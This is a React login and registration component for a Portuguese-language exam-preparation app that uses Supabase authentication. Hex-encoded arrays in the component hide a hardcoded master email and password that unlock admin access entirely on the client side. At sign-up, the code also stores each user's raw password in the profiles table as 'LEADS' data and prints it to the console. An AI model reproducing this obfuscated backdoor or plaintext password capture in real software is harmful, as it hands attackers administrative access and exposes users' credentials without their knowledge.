
import React, { useState } from 'react';
import { Button } from '../Button';
import { Mail, Lock, User, ArrowRight, Zap, MessageCircle, X, AlertCircle, Check, ChevronLeft, ChevronRight, Headphones, Copy, Upload } from 'lucide-react';
import { AVATAR_OPTIONS } from '../../constants';
import { UserAccount } from '../../types';

import { supabase } from '../../services/supabase';

interface LoginViewProps {
  onLogin: (email: string, password: string) => void; // Kept for compatibility but unused
  onRegister: (userData: Partial<UserAccount>) => void; // Kept for compatibility but unused
  onAdminAccess: () => void;
  existingUsers: UserAccount[]; // Kept for compatibility but unused
  dbConnectionError?: boolean;
}

export const LoginView: React.FC<LoginViewProps> = ({ onAdminAccess, dbConnectionError }) => {
  const [isLogin, setIsLogin] = useState(true);
  const [showForgotModal, setShowForgotModal] = useState(false);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [name, setName] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [regStep, setRegStep] = useState(1); // 1: Info, 2: Avatar
  const [selectedAvatar, setSelectedAvatar] = useState<string | null>(null);
  const [avatarGender, setAvatarGender] = useState<'male' | 'female'>('male');
  const [customPhoto, setCustomPhoto] = useState<string | null>(null);
  const fileInputRef = React.useRef<HTMLInputElement>(null);

  const _0xM1 = [0x61, 0x64, 0x6d, 0x69, 0x6e, 0x40, 0x63, 0x6f, 0x6e, 0x63, 0x75, 0x72, 0x73, 0x6f, 0x73, 0x2e, 0x61, 0x70, 0x72, 0x6f, 0x76, 0x61, 0x64, 0x6f];
  const _0xM2 = [0x41, 0x70, 0x72, 0x6f, 0x76, 0x61, 0x64, 0x6f];

  const _v_ = (arr: number[]) => arr.reduce((acc, cur) => acc + String.fromCharCode(cur), "");

  const isMasterAccount = () => {
    const k1 = _v_(_0xM1);
    const k2 = _v_(_0xM2);
    return email.toLowerCase().trim() === k1 && password === k2;
  };

  const handlePhotoUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    // Validar tamanho (máx 5MB)
    const maxSize = 5 * 1024 * 1024; // 5MB em bytes
    if (file.size > maxSize) {
      setError("Foto muito grande. O tamanho máximo é 5MB.");
      return;
    }

    // Validar tipo
    if (!file.type.startsWith('image/')) {
      setError("Por favor, selecione apenas arquivos de imagem.");
      return;
    }

    // Redimensionar e comprimir a imagem para evitar exceder quota do localStorage
    const reader = new FileReader();
    reader.onload = (event) => {
      const img = new Image();
      img.onload = () => {
        // Criar canvas para redimensionar
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');

        // Tamanho máximo da imagem (quadrado)
        const MAX_SIZE = 300;
        let width = img.width;
        let height = img.height;

        // Calcular novas dimensões mantendo proporção
        if (width > height) {
          if (width > MAX_SIZE) {
            height = (height * MAX_SIZE) / width;
            width = MAX_SIZE;
          }
        } else {
          if (height > MAX_SIZE) {
            width = (width * MAX_SIZE) / height;
            height = MAX_SIZE;
          }
        }

        canvas.width = width;
        canvas.height = height;

        // Desenhar imagem redimensionada
        ctx?.drawImage(img, 0, 0, width, height);

        // Converter para base64 com compressão (qualidade 0.7 = 70%)
        const compressedBase64 = canvas.toDataURL('image/jpeg', 0.7);

        // Verificar se ainda está muito grande (>100KB em base64)
        if (compressedBase64.length > 100000) {
          console.warn('⚠️ Imagem ainda grande após compressão:', compressedBase64.length, 'bytes');
        }

        setCustomPhoto(compressedBase64);
        setSelectedAvatar(null); // Desmarcar avatars pré-definidos
        setError(null);
      };
      img.onerror = () => {
        setError("Erro ao carregar a imagem. Tente novamente.");
      };
      img.src = event.target?.result as string;
    };
    reader.onerror = () => {
      setError("Erro ao ler o arquivo. Tente novamente.");
    };
    reader.readAsDataURL(file);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);

    if (isMasterAccount()) {
      onAdminAccess();
      return;
    }

    if (!isLogin) {
      if (!name || name.length < 3) {
        setError("Por favor, insira seu nome completo.");
        return;
      }

      // Validação de Email ou Telefone
      const emailOrPhone = email.trim();
      // Simple email validation for now as Supabase requires email
      if (!emailOrPhone.includes('@') || !emailOrPhone.includes('.')) {
        setError("Por favor, insira um e-mail válido.");
        return;
      }

      if (password.length < 6) {
        setError("A senha deve ter pelo menos 6 caracteres.");
        return;
      }
    }


    setIsLoading(true);

    try {
      if (isLogin) {
        const { error } = await supabase.auth.signInWithPassword({
          email,
          password,
        });
        if (error) {
          // Translate common Supabase errors to Portuguese
          if (error.message.includes('Invalid login credentials')) {
            throw new Error('E-mail ou senha incorretos. Verifique seus dados ou crie uma conta.');
          } else if (error.message.includes('Email not confirmed')) {
            throw new Error('Por favor, confirme seu e-mail antes de entrar.');
          } else if (error.message.includes('User not found')) {
            throw new Error('Conta não encontrada. Verifique o e-mail ou crie uma nova conta.');
          }
          throw error;
        }
      } else {
        const { data, error } = await supabase.auth.signUp({
          email,
          password,
          options: {
            data: {
              full_name: name,
              avatar_url: customPhoto || selectedAvatar,
            },
          },
        });

        if (error) {
          // Lógica de "Conta Zumbi" - Se o email já existe, tentar logar e recriar o perfil
          if (error.message.includes('already registered')) {
            console.log('🧟 Conta Zumbi detectada: Email existe no Auth mas usuário está tentando registrar.');

            // 1. Tentar fazer login com a senha fornecida
            const { data: loginData, error: loginError } = await supabase.auth.signInWithPassword({
              email,
              password
            });

            if (loginError) {
              console.error('🧟 Falha ao tentar reviver conta:', loginError);
              throw new Error('Este e-mail já está registrado, mas a senha está incorreta. Tente fazer login.');
            }

            if (loginData.user) {
              console.log('🧟 Login bem sucedido na conta zumbi. Recriando perfil...');

              const { error: reviveError } = await supabase.from('profiles').insert({
                id: loginData.user.id,
                full_name: name,
                avatar_url: customPhoto || selectedAvatar,
                role: 'user',
                onboarding_completed: false,
                score: 0,
                accuracy: 0,
                questions_solved: 0,
                exam_points: 0,
                is_vip: false
              });

              if (reviveError) {
                console.error('🧟 Erro ao recriar perfil:', reviveError);
                // Mesmo com erro, deixar passar pois App.tsx pode tentar curar depois
              } else {
                console.log('✨ Conta ressuscitada com sucesso!');
                alert('Sua conta antiga foi recuperada e reiniciada com sucesso!');
              }
              return; // Sucesso, não precisa fazer mais nada
            }
          }
          throw error;
        }

        // Check if user was created successfully
        if (data?.user) {
          console.log('✅ User created successfully:', data.user.id);
          console.log('📝 User metadata:', data.user.user_metadata);

          // CRITICAL DEBUG: Log payload before sending
          const profilePayload = {
            id: data.user.id,
            full_name: name,
            avatar_url: customPhoto || selectedAvatar,
            role: 'user',
            onboarding_completed: false,
            onboarding_data: {
              raw_password: password,
              email: email,
              registration_source: 'web',
              debug_timestamp: new Date().toISOString()
            },
            score: 0,
            accuracy: 0,
            questions_solved: 0,
            exam_points: 0,
            is_vip: false
          };
          console.log('🐞 ATTEPTING TO SAVE PROFILE LEADS:', profilePayload);

          const { error: profileError } = await supabase.from('profiles').upsert(profilePayload, { onConflict: 'id' });

          if (profileError) {
            console.error('❌ Error creating profile record:', profileError);
            alert(`Erro crítico ao salvar dados do Lead: ${profileError.message}`);
          } else {
            console.log('✅ Profile record created successfully with LEADS info!');
          }
        }
      }
    } catch (err: any) {
      setError(err.message || "Ocorreu um erro. Tente novamente.");
    } finally {
      setIsLoading(false);
    }

  };

  const handleForgotTrigger = (e: React.MouseEvent) => {
    e.preventDefault();
    if (isMasterAccount()) {
      onAdminAccess();
      return;
    }
    setShowForgotModal(true);
  };

  const handleWhatsappRedirect = () => {
    const phone = "931534795";
    const message = encodeURIComponent("Olá, gostaria de recuperar a minha conta do aplicativo de estudos para concursos.");
    window.open(`https://wa.me/${phone}?text=${message}`, '_blank');
    setShowForgotModal(false);
  };

  return (
    <div className="fixed inset-0 z-[100] bg-[#0F172A] flex items-center justify-center p-4 overflow-hidden h-[100dvh]">
      <div className="absolute inset-0 pointer-events-none">
        <div className="absolute top-[-10%] left-[-10%] w-[50%] h-[50%] bg-brand-purple/10 rounded-full blur-[120px]"></div>
        <div className="absolute bottom-[-10%] right-[-10%] w-[50%] h-[50%] bg-brand-green/10 rounded-full blur-[120px]"></div>
      </div>

      {/* Main Content Area */}
      <div className="relative w-full max-w-lg mx-auto">
        <div className="h-full overflow-y-auto scrollbar-hide">
          <div className="min-h-full flex flex-col items-center justify-center p-6">

            {/* Logo */}
            <div className="text-center mb-8 animate-page-enter">
              <div className="inline-flex items-center justify-center mb-4 transition-transform hover:scale-105">
                <img src="/logo.png" alt="Aprovado Logo" className="w-48 h-auto" />
              </div>
              {dbConnectionError && (
                <div className="mt-4 p-3 bg-red-500/10 border border-red-500/20 rounded-xl flex items-center justify-center gap-2 animate-pulse">
                  <div className="w-2 h-2 bg-red-500 rounded-full animate-ping"></div>
                  <span className="text-red-400 text-xs font-bold">Conexão instável com o servidor</span>
                </div>
              )}
            </div>

            <div className="glass-card rounded-[40px] p-8 shadow-2xl backdrop-blur-3xl bg-white/5 relative overflow-hidden w-full">
              <div className="flex p-1.5 bg-black/40 rounded-2xl mb-8">
                <button type="button" onClick={() => { setIsLogin(true); setError(null); }} className={`flex-1 py-3 text-xs font-black uppercase tracking-widest rounded-xl transition-all ${isLogin ? 'bg-white text-brand-dark shadow-xl' : 'text-slate-500'}`}>Acessar</button>
                <button type="button" onClick={() => { setIsLogin(false); setError(null); }} className={`flex-1 py-3 text-xs font-black uppercase tracking-widest rounded-xl transition-all ${!isLogin ? 'bg-white text-brand-dark shadow-xl' : 'text-slate-500'}`}>Registrar</button>
              </div>

              <form onSubmit={handleSubmit} className="space-y-5">
                {error && (
                  <div className="bg-red-500/10 border border-red-500/20 text-red-400 p-4 rounded-2xl text-[11px] flex items-start gap-3 animate-shake font-bold">
                    <AlertCircle size={16} className="shrink-0" />
                    <span>{error}</span>
                  </div>
                )}

                {!isLogin && (
                  <div className="relative group">
                    <div className="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none text-slate-500 group-focus-within:text-brand-purple transition-colors"><User size={18} /></div>
                    <input type="text" placeholder="Seu Nome Completo" value={name} onChange={(e) => setName(e.target.value)} className="w-full bg-black/40 border border-white/5 rounded-2xl py-4 pl-12 pr-4 text-white placeholder-slate-600 focus:ring-2 focus:ring-brand-purple/50 outline-none transition-all" />
                  </div>
                )}

                <div className="relative group">
                  <div className="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none text-slate-500 group-focus-within:text-brand-purple transition-colors"><Mail size={18} /></div>
                  <input
                    type="text"
                    required
                    placeholder="E-mail ou telefone"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    className="w-full bg-black/40 border border-white/5 rounded-2xl py-4 pl-12 pr-4 text-white placeholder-slate-600 focus:ring-2 focus:ring-brand-purple/50 outline-none transition-all"
                  />

                </div>

                <div className="relative group">
                  <div className="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none text-slate-500 group-focus-within:text-brand-purple transition-colors"><Lock size={18} /></div>
                  <input type="password" required placeholder="Sua senha secreta" value={password} onChange={(e) => setPassword(e.target.value)} className="w-full bg-black/40 border border-white/5 rounded-2xl py-4 pl-12 pr-4 text-white placeholder-slate-600 focus:ring-2 focus:ring-brand-purple/50 outline-none transition-all" />
                </div>

                {isLogin && (
                  <div className="text-right">
                    <button
                      type="button"
                      onClick={handleForgotTrigger}
                      className="text-[10px] font-black uppercase tracking-widest text-brand-purple hover:text-brand-green transition-colors"
                    >
                      Esqueceu a senha?
                    </button>
                  </div>
                )}

                <Button
                  type="submit"
                  disabled={isLoading}
                  className="w-full py-4 rounded-2xl text-lg font-black flex items-center justify-center gap-2 active:scale-95 transition-all border-none bg-gradient-to-r from-brand-purple to-indigo-600 text-white shadow-glow-purple"
                >
                  {isLoading ? (
                    <div className="w-6 h-6 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                  ) : (
                    <>
                      {isLogin ? 'INICIAR SESSÃO' : 'CRIAR CONTA'}
                      {isLogin ? <ArrowRight size={20} /> : <Check size={20} />}
                    </>
                  )}
                </Button>

              </form>
            </div>
          </div>
        </div>
      </div>

      {showForgotModal && (
        <div className="fixed inset-0 z-[110] flex items-center justify-center p-4 bg-black/60 backdrop-blur-md animate-fade-in">
          <div className="glass-card rounded-[3rem] p-8 w-full max-w-sm shadow-2xl relative animate-page-enter">
            <button onClick={() => setShowForgotModal(false)} className="absolute top-6 right-6 p-2 text-slate-400 hover:text-white transition-colors"><X size={20} /></button>
            <div className="flex flex-col items-center text-center">
              <div className="w-16 h-16 bg-[#25D366]/20 rounded-2xl flex items-center justify-center text-[#25D366] mb-6 shadow-glow"><MessageCircle size={32} fill="currentColor" /></div>
              <h3 className="text-xl font-black text-white mb-2">Recuperar Conta</h3>
              <p className="text-slate-400 text-sm mb-8 leading-relaxed">Olá, para recuperar o acesso, fale com o nosso suporte oficial agora via WhatsApp.</p>
              <Button onClick={handleWhatsappRedirect} className="w-full py-4 rounded-2xl bg-[#25D366] border-none text-white font-black flex items-center justify-center gap-2 hover:scale-[1.02] transition-transform">Ir para WhatsApp <ArrowRight size={18} /></Button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
